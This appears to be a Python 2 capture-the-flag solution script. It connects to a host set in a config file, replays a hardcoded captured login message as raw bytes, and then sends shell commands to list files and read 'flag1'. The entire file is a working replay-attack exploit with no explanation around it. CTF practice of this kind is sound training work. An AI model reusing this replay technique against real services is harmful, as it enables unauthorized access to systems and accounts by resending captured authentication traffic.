import socket
import config

msg = '\x30\x30\x30\x30\x30\x32\x35\x36\x19\xd9\x3e\xb5\xb3\x1b\xc1\x4f\xa5\xcb\x92\xbe\xf4\x9c\xc2\x1d\xb9\x84\xfe\x5c\x59\x5d\x3a\x9d\xd5\x1a\x13\xdb\xff\x5a\x83\x27\x29\x05\xc3\x1f\x33\xfd\x0b\xf7\xba\xe0\x5e\x4d\xd5\x24\x81\x28\x14\x09\x14\x72\xd9\x33\xa9\x49\x8a\x4c\xc4\xa6\xb0\x0c\x88\x37\x6d\xe0\xad\x7d\xa3\xbc\x71\x97\x70\x2c\x38\x22\x5b\xb7\x1c\x76\x63\x12\xb3\x9e\xc3\x9d\x0b\x31\x7d\x69\x83\xbb\x4f\x7a\x59\x15\x41\x07\xc3\xca\x32\x4f\x61\x9a\x73\x07\x03\xfe\xec\x6d\xbd\x6b\x91\x27\x40\x21\x1b\x6d\xe9\x9a\x73\xeb\x88\x1e\xcb\xad\xa7\xb2\xb4\x08\x19\x2c\x7d\x4a\x15\x45\x0f\x71\xa9\xa8\x87\x99\x00\x5b\x5b\x94\xa5\xeb\x8b\x9d\x75\xcf\xbb\x9f\xb4\xb0\xef\x82\xe2\xc1\xf0\x6a\xab\xc5\xbd\x23\xcd\x6b\xa8\x3c\x90\x0f\xb9\xb6\x9b\x8f\x6a\xab\x83\xe0\x84\xdd\x44\x4a\xf5\xaa\x1c\xf6\x7b\x81\xb8\xdf\x01\x78\xa2\x22\x85\x49\xe3\x00\x36\x95\x41\x10\x78\xed\x5c\x38\xd8\x3c\xac\xad\xfd\x9b\xa7\xe6\x55\x59\x4e\xae\x79\x7f\x8b\x4c\xf6\x58\x81\x3e\xc9\xdc\x40\xb9\x12\x91\xa0\x6c\xc1\xad\x24\xfd\x57\xaa\x08\x23\xd8\x06\x4f\x8d\x33\xe2\x6d\xbf\xed\xc3\xa6\xaa'

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (config.HOST, config.PORT)
    print 'connecting to %s port %s' % server_address
    sock.connect(server_address)

    sock.sendall(msg+'\r\n')  # replay login message
    sock.sendall('ls\r\n')  # to list the file
    sock.sendall('cat flag1\r\n')  # to get flag1

    # send login
    while True:
        data = sock.recv(1024)
        if data:
            print data

    print 'Close the socket!'
    sock.close()

if __name__ == '__main__':
    main()
